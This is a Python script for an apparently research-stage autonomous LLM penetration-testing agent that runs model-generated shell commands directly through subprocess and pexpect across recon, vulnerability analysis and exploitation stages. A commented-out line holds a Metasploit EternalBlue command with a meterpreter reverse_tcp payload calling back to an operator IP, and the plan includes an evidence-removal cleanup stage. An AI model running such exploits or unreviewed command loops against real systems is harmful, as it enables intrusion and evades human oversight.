from classes.Args import process_args_and_env
#Classes
from classes.Database import DbStorage
from classes.LLM import LLMWithState
from classes.TaskTree import TaskTree
from llms.llm_connection import get_llm_connection
# Rich Console
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
import json
import time
import pexpect
import subprocess
import threading
# import wexpect


# helper to fill the history table with data from the db
def get_history_table(config, run_id: int, db: DbStorage, round: int) -> Table:
    table = Table(title="Executed Command History", show_header=True, show_lines=True)
    table.add_column("ThinkTime", style="dim")
    table.add_column("Tokens", style="dim")
    table.add_column("Cmd")
    table.add_column("Resp. Size", justify="right")
    table.add_column("Explanation")
    table.add_column("ExplTime", style="dim")
    table.add_column("ExplTokens", style="dim")
    table.add_column("StateUpdTime", style="dim")
    table.add_column("StateUpdTokens", style="dim")

    for i in range(0, round+1):
        table.add_row(*db.get_round_data(run_id, i))
    return table


# setup infrastructure for outputing information
console = Console(force_interactive=False) # No animations
# console = Console() 

# Load Config
config = process_args_and_env(console)
console.log(config)

# setup in-memory/persistent storage for command history
db = DbStorage()
db.connect()
db.setup()

# create an identifier for this session/run
run_id = db.create_new_run(config)

# setup the connection to the LLM server
llm_connection = get_llm_connection(config)

# import Task tree
task_tree = TaskTree()

constraints = "Avoid service disruption. Don't exploit any services. Remain in Scope of the 1 machine."
current_objective = "Initial Recon"
current_role = "As a pentesting operator, I am currently working on a Debian Linux machine in a bash shell at the ip '10.10.16.4'. My objective is to perform a black box penetration test on a machine. Following the standard pentesting methodology of Recon and information gathering, Vulnerability Analysis, Exploitation, Post Exploitation, and Pivoting."

# instantiate the concrete LLM model
llm_gpt = LLMWithState(run_id, llm_connection, db, config, constraints, current_objective, current_role, task_tree)
# Create agent LLM without as much context and new history

# setup round meta-data
round : int = 0
gotRoot : bool = False
gotFoothold : bool = False
gotLowPrivUser : bool = False
objectivesAchieved: bool = False

# Define what stage the tool is in to give prior context
task_tree.add_task_to_tree("Root", "Active Reconnaissance", "Initial Recon and Enumeration")
task_tree.add_task_to_tree("Root", "Vulnerability Analysis", "Vulnerability Scanning")
task_tree.add_task_to_tree("Root", "Exploitation", "Exploitation of Vulnerabilities")
task_tree.add_task_to_tree("Root", "Post Exploitation", "Deep dive into the system's internal environment")
task_tree.add_task_to_tree("Root", "Privilege Escalation", "Identify local vulnerabilities for elevated privs")
task_tree.add_task_to_tree("Root", "Lateral Movement", "Assess and prioritize valuable data")
task_tree.add_task_to_tree("Root", "Cleanup", "Prepare steps to remove evidence of the pentest")

target_network = []
decisions = []

def handle_cmd(input):
    if "sudo" in input:
        input = input.replace("sudo", "")
    process = subprocess.Popen(input, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    result, error = process.communicate()
    return input, result, error


def recon():
    # Define objectives
    stage = "Active Reconnaissance"
    console.rule("[bold red]" + stage)
    with console.status("[bold green]Adding Recon Tasks to the task tree...") as status:
        local_tasks = llm_gpt.get_objectives(stage)
        tasks = json.loads(local_tasks.result)
        for task in tasks:
            task_tree.add_task_to_tree(stage, str(task), "")
        console.print(Panel(task_tree.to_table(), title="Task Tree"))

    #Constants
    max_time_per_task = 300  # Maximum time per recon task in seconds
    #--Diminishing Returns
    max_iterations = 3  # Maximum number of recon iterations
    min_new_information = 0.1  # Minimum new information threshold
    #--Time
    start_time = time.time()
    #--Tasks
    current_task = 0
    iterations = 0
    #--Hold temporary
    curr_analyzation = ""
    
    # Proceed when task has been completed
    while current_task < max_iterations:
        # Start Time
        # Main Loop that will handle objectives
        console.log(f"[yellow]Starting iteration {iterations} of {max_iterations}")
        cmd = ""
        stdout = ""
        stderr = ""

        
        llm_gpt.set_current_task(tasks[current_task])
        llm_gpt.set_current_analyzation(curr_analyzation)
        console.log(f"[yellow]Current Task: {tasks[current_task]}")
        
        # Construct Prompt for cmd to run
        with console.status("[bold green]Asking LLM for a new command...") as status:
            # TODO add more prompt generation and engineering here
            response = llm_gpt.get_next_cmd()
            console.print(Panel(response.result, title="[bold cyan]Got command from LLM:"))
        
        # Run Command
        with console.status("[bold green]Executing that command...") as status:
            cmd, result, error = handle_cmd(response.result)
            stdout = result.decode('utf-8')
            stderr = error.decode('utf-8')     
            console.print(Panel(stdout, title=f"[bold cyan]{cmd}"))
            db.add_log_query(run_id, round, cmd, stdout, response)
            db.add_log_command(run_id, cmd, stdout)  
        
        with console.status("[bold green]Analyze its result...") as status:
            # Where we would put in a better solution to analyze the results
            # summary_max_chars = int(config.context_size * .01) # 1% of the context size
            summary_max_chars = 500
            analyzation = llm_gpt.analyze_result(cmd, stdout, stderr, summary_max_chars)
            console.print(Panel(analyzation.result, title="[bold cyan]Analyzation"))
            db.add_log_analyze_response(run_id, round, cmd, analyzation.result, analyzation)
            curr_analyzation = analyzation.result

        # Update state and history and objective and task tree
        ## Update State
        with console.status("[bold green]Updating fact list..") as status:
            previous_state = llm_gpt.get_current_state()
            state = llm_gpt.update_state(cmd, stdout)
            console.print(Panel(state.result, title="[bold cyan]State"))
            db.add_log_update_state(run_id, round, "", state.result, state)

        # Update Task Tree
        with console.status("[bold green] Evaluating progress...") as status:
            response = llm_gpt.evaluate_task_progress(stage, tasks[current_task], time.time(), start_time, max_time_per_task, iterations, state.result, previous_state, max_iterations, min_new_information)
            console.print(Panel(response.result, title="[bold cyan]Evaluated Progress of Recon"))
            if "TRUE" in response.result:
                console.log("[bold red]LLM decides we should keep trying...")
            else:
                console.log("[bold green]LLM decides we should move on...")
                task_tree.update_task_status(stage, task_name=tasks[current_task], status="completed")
                current_task += 1
                if (current_task == 5):
                    # If all tasks are completed
                    # have LLM assess if we are finished or need to revisit
                    # Proceed to next pentest step
                    current_task=0
                    break;


        # Output Round Data
        # console.print(get_history_table(config, run_id, db, round))

        # Output Task Tree
        console.print(Panel(task_tree.to_table(), title=f"[bold cyan] Task Tree"))

        # Output LLM State of Result
        console.print(Panel(llm_gpt.get_current_state(), title="What does the LLM Know about the system?"))

        # # finish round and commit logs to storage
        db.commit()
        iterations += 1


def vulnerability_analysis():
    # Define objectives
    stage = "Vulnerability Analysis"
    local_tasks = llm_gpt.get_objectives(stage)
    tasks = json.loads(local_tasks.result)
    with console.status("[bold green]Adding Recon Tasks to the task tree...") as status:
        for task in tasks:
            task_tree.add_task_to_tree(stage, str(task), "")
            console.print(Panel(task_tree.to_table(), title="Task Tree"))

    #Constants
    max_time_per_task = 300  # Maximum time per recon task in seconds
    #--Diminishing Returns
    max_iterations = 3  # Maximum number of recon iterations
    min_new_information = 0.1  # Minimum new information threshold
    #--Time
    start_time = time.time()
    #--Tasks
    current_task = 0
    iterations = 0
    #--Hold temporary
    curr_analyzation = ""
    
    # Proceed when task has been completed
    while current_task < max_iterations:
        # Start Time
        # Main Loop that will handle objectives
        console.log(f"[yellow]Starting iteration {iterations} of {max_iterations}")
        cmd = ""
        stdout = ""
        stderr = ""

        llm_gpt.set_current_task(tasks[current_task])
        llm_gpt.set_current_analyzation(curr_analyzation)
        console.log(f"[yellow]Current Task: {tasks[current_task]}")
        # Construct Prompt for cmd to run
        with console.status("[bold green]Asking LLM for a new command...") as status:
            # TODO add more prompt generation and engineering here
            response = llm_gpt.get_next_cmd()
            console.print(Panel(response.result, title="[bold cyan]Got command from LLM:"))
        
        # Run Command
        with console.status("[bold green]Executing that command...") as status:
            cmd, result, error = handle_cmd(response.result)
            stdout = result.decode('utf-8')
            stderr = error.decode('utf-8')     
            console.print(Panel(stdout, title=f"[bold cyan]{cmd}"))
            db.add_log_command(run_id, cmd, stdout) 

        # Analyze its results
        with console.status("[bold green]Analyze its result...") as status:
            # Where we would put in a better solution to analyze the results
            # summary_max_chars = int(config.context_size * .01) # 1% of the context size
            summary_max_chars = 500
            analyzation = llm_gpt.analyze_result(cmd, stdout, stderr, summary_max_chars)
            console.print(Panel(analyzation.result, title="[bold cyan]Analyzation"))
            db.add_log_analyze_response(run_id, round, cmd, analyzation.result, analyzation)
            curr_analyzation = analyzation.result

        # Update state and history and objective and task tree
        with console.status("[bold green]Updating fact list..") as status:
            previous_state = llm_gpt.get_current_state()
            state = llm_gpt.update_state(cmd, stdout)
            console.print(Panel(state.result, title="[bold cyan]State"))
            db.add_log_update_state(run_id, round, "", state.result, state)

        # Update Task Tree
        task_tree.update_task_status(stage, task_name=tasks[current_task], status="completed")

        with console.status("[bold green] Evaluating progress...") as status:
            response = llm_gpt.evaluate_task_progress(stage, tasks[current_task], time.time(), start_time, max_time_per_task, iterations, previous_state, state.result, max_iterations, min_new_information)
            console.print(Panel(response.result, title="[bold cyan]Evaluating Progress of Recon"))
            if "TRUE" in response.result:
                console.log("[bold red]LLM decides we should keep trying...")
            else:
                console.log("[bold green]LLM decides we should move on...")
                task_tree.update_task_status(stage, task_name=tasks[current_task], status="completed")
                current_task += 1
                if (current_task == 5):
                    # If all tasks are completed
                    # have LLM assess if we are finished or need to revisit
                    # Proceed to next pentest step
                    current_task=0
                    break;


        # Output Round Data
        # console.print(get_history_table(config, run_id, db, round))

        # Output Task Tree
        console.print(Panel(task_tree.to_table(), title=f"[bold cyan] Task Tree"))

        # Output LLM State of Result
        console.print(Panel(llm_gpt.get_current_state(), title="What does the LLM Know about the system?"))


        # Evaluate Progress

        # # finish round and commit logs to storage
        db.commit()
        iterations += 1

def print_output(child):
    """
    Ran by a thread to tap into the buffer to read output
    """
    try:
        while True:
            line = child.readline()
            if not line:  # No more output
                break
            console.log("[bold white]"+ line)  # Print output as it comes
    except pexpect.exceptions.EOF:
        print("End of File reached by pexpect.")
    except pexpect.exceptions.TIMEOUT:
        print("Timeout reached by pexpect.")
    except Exception as e:
        print("An error occurred:", e)

def continuous_read(child):
    """
    Give the LLM an update on the buffer every 5 seconds
    to allow it to "read"
    """
    output_buffer = ""
    while not child.terminated:
        try:
            output_buffer += child.read_nonblocking(size=1024, timeout=1).decode('utf-8')
        except pexpect.TIMEOUT:
            continue  # Normal behavior, just no data this second
        except pexpect.EOF:
            break  # Child has terminated, exit loop

        # Send data to LLM every 5 seconds
        if len(output_buffer) > 0:
            context = llm_gpt.analyzation(output_buffer)
            print(f"LLM Context Analysis: {context.results}")
            output_buffer = ""  # Reset buffer after sending

        time.sleep(5)  # Wait for a while before reading more data


def exploit():
    # Define objectives
    stage = "Exploitation"
    llm_gpt.constraints = "Stay within machine scope. Don't conduct any additonal recon."
    # local_tasks = llm_gpt.get_objectives(stage, context)
    local_tasks = llm_gpt.get_objectives(stage, llm_gpt.get_current_state())
    tasks = json.loads(local_tasks.result)

    with console.status("[bold green]Adding Tasks to the task tree...") as status:
        for task in tasks:
            task_tree.add_task_to_tree(stage, str(task), "")
        console.print(Panel(task_tree.to_table(), title="Task Tree"))
    #Constants
    max_time_per_task = 300  # Maximum time per recon task in seconds

    # Diminishing Returns
    max_iterations = 5  # Maximum number of recon iterations
    min_new_information = 0.1  # Minimum new information threshold
    current_task = 0
    start_time = time.time()
    iterations = 0
    curr_analyzation = ""
    
    # Proceed when task has been completed
    while current_task < 3:
        # Start Time
        # Main Loop that will handle objectives
        console.log(f"[yellow]Starting iteration {iterations} of {max_iterations}")
        cmd = ""
        stdout = ""
        stderr = ""

        llm_gpt.set_current_task(tasks[current_task])
        llm_gpt.set_current_analyzation(curr_analyzation)
        # Construct Prompt for cmd to run
        with console.status("[bold green]Asking LLM for a new command...") as status:
            # TODO add more prompt generation and engineering here
            response = llm_gpt.get_next_cmd()
            cmd = response.result
            # cmd = 'msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOSTS 10.10.10.40; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.16.4; run"' 
            # The timeout is sorta long to catch short password prompt things, but it should be fine
            child = pexpect.spawn('/bin/bash', ['-c', cmd], timeout=60, encoding='utf-8', codec_errors='ignore')
            console.print(Panel(cmd, title="[bold cyan]Got command from LLM:"))

        # Start output thread   
        output_thread = threading.Thread(target=print_output, args=(child,))
        output_thread.start()
        spawn_timer = time.time()
        k = 0
    

        with console.status("[bold green]Asking LLM for a command expectations...") as status:
            # The reason we have to do this is because we can't get the output of a command if it
            # has ended yet, so we have to expect the output that is going to produce so that
            # we can start the interactive process
            cmd_expectations = llm_gpt.get_expect_matches(str(cmd))
            expectations = json.loads(cmd_expectations.result)
            expectations.extend([pexpect.TIMEOUT, pexpect.EOF])
            print(expectations)
        # expectations = ["msf6", "meterpreter >", pexpect.EOF, pexpect.TIMEOUT]
        
        # console.print(Panel(expectations, title="[bold cyan]Expectations for this command from LLM:"))
        temp_constraints = "Keep within scope of the tool."
        
        # Establishing role for command agent
        temp_role = """ You have initiated a pexpect session with a
        command-line interface tool and successfully launched the application
        using a one-liner bash command. You are now within the framework of the
        tool, with the console prompt ready for further interaction. an EOF in
        this session means the command is complete, and a Timeout means the
        command is waiting for input """

        temp_history = ""
        temp_history += cmd # Add the command to the history
        while k < 3:
            k += 1
            console.print("[bold red] Command Agent Loop Iteration: ", k)
            # with console.status("[bold green]Expecting..") as status:
            try:
                child.expect(expectations)
                # if isinstance(child.after, pexpect.EOF):
                #     child.after = "EOF"
                stdout = str(child.before) + str(child.after)
                console.print(Panel(stdout, title="[bold cyan]Context of expect:"))
            except pexpect.TIMEOUT:
                print(f"Command timed out: {response.result}")
                stdout = child.before
            except pexpect.EOF:
                print(f"Command ended: {response.result}")
                stdout = child.before
            except Exception as e:
                print(f"Exception: An error occurred: {str(e)}")

            # Analyze output for using the desired prompt

            # Update state and history and objective and task tree 
            # This should probably have its own state
            with console.status("[bold green]Updating fact list..") as status:
                previous_state = llm_gpt.get_current_state()
                state = llm_gpt.update_state(cmd, stdout)
                console.print(Panel(state.result, title="[bold cyan]State"))
                db.add_log_update_state(run_id, round, "", state.result, state)

            #Evaluate State
            with console.status("[bold green] Evaluating progress...") as status:
                response = llm_gpt.evaluate_task_progress(stage, tasks[current_task], time.time(), start_time, max_time_per_task, iterations, previous_state, state.result, max_iterations, min_new_information)
                console.print(Panel(response.result, title="[bold cyan]Evaluating Progress of Recon"))
                if "TRUE" in response.result:
                    console.log("[bold red]LLM decides we should keep trying...")
                else:
                    console.log("[bold green]LLM decides we should move on...")
                    task_tree.update_task_status(stage, task_name=tasks[current_task], status="completed")
                    current_task += 1
                    if (current_task == 3):
                        # If all tasks are completed
                        # have LLM assess if we are finished or need to revisit
                        # Proceed to next pentest step
                        current_task=0
                        break;
            # evaluation = llm_gpt.evaluate_progress(stage, tasks[current_task], time.time(), start_time, max_time_per_task, iterations, state.result, previous_state, max_iterations, min_new_information)
            # console.print(Panel(evaluation.result, title="[bold cyan]Evaluating Progress of Recon"))
            response = llm_gpt.analyze_interactive_result(cmd, stdout, llm_gpt.get_current_state(), 500)
            console.print(Panel(response.result, title="[bold cyan]Analyzation"))

            # with console.status("[bold green]Getting next command...") as status:
            icmd = llm_gpt.get_next_icmd(stdout, temp_history, temp_role, response.result)
            if(icmd.result == '\x03' or icmd.result == 'exit'):
                break
            console.print(Panel(icmd.result, title="[bold cyan]Got next icommand from LLM:"))
            
            # Send cmd to pexpect
            # with console.status("[bold red]Sending LLM response to process") as status:
            child.sendline(icmd.result)
            temp_history += icmd.result
            console.print(Panel(icmd.result, title="[bold cyan]Sent command to LLM:"))
            
            # Update state and history and objective and task tree



        # Analyze what happened in the command agent
        with console.status("[bold green]Analyze its result...") as status:
            # Where we would put in a better solution to analyze the results
            # summary_max_chars = int(config.context_size * .01) # 1% of the context size
            summary_max_chars = 500
            analyzation = llm_gpt.analyze_interactive_result(cmd, stdout, llm_gpt.get_current_state(), summary_max_chars)
            console.print(Panel(analyzation.result, title="[bold cyan]Analyzation"))
            db.add_log_analyze_response(run_id, round, cmd, analyzation.result, analyzation)
            curr_analyzation = analyzation.result

        # Update state and history and objective and task tree
        ## Update State
        with console.status("[bold green]Updating fact list..") as status:
            previous_state = llm_gpt.get_current_state()
            state = llm_gpt.update_state(cmd, stdout)
            console.print(Panel(state.result, title="[bold cyan]State"))
            db.add_log_update_state(run_id, round, "", state.result, state)

        # Update Task Tree
        with console.status("[bold green] Evaluating progress...") as status:
            response = llm_gpt.evaluate_task_progress(stage, tasks[current_task], time.time(), start_time, max_time_per_task, iterations, previous_state, state.result, max_iterations, min_new_information)
            console.print(Panel(response.result, title="[bold cyan]Evaluating Progress of Recon"))
            if "TRUE" in response.result:
                console.log("[bold red]LLM decides we should keep trying...")
            else:
                console.log("[bold green]LLM decides we should move on...")
                task_tree.update_task_status(stage, task_name=tasks[current_task], status="completed")
                current_task += 1
                if (current_task == 5):
                    # If all tasks are completed
                    # have LLM assess if we are finished or need to revisit
                    # Proceed to next pentest step
                    current_task=0
                    break;


        # Output Round Data
        # console.print(get_history_table(config, run_id, db, round))

        # Output Task Tree
        console.print(Panel(task_tree.to_table(), title=f"[bold cyan] Task Tree"))

        # Output LLM State of Result
        console.print(Panel(llm_gpt.get_current_state(), title="What does the LLM Know about the system?"))

        # Evaluate Progress
        # # finish round and commit logs to storage
        db.commit()
        iterations += 0

# ----------------------------------------------------------------------------------------------------------
# MAIN LOOP
# ----------------------------------------------------------------------------------------------------------
# This is the main chain of actions that will be taken by the LLM
recon()
task_tree.update_task_status( parent_task_name="Root", task_name="Active Reconnaissance", status="completed")
vulnerability_analysis()
task_tree.update_task_status( parent_task_name="Root", task_name="Vulnerability Analysis", status="completed")
exploit()
task_tree.update_task_status( parent_task_name="Root", task_name="Exploitation", status="completed")

## Testing of the interactive commands
    # Here we are going to try and construct the pexpect chain
    # Pre prep for the LLM so we don't have to construct recon
# exploit()
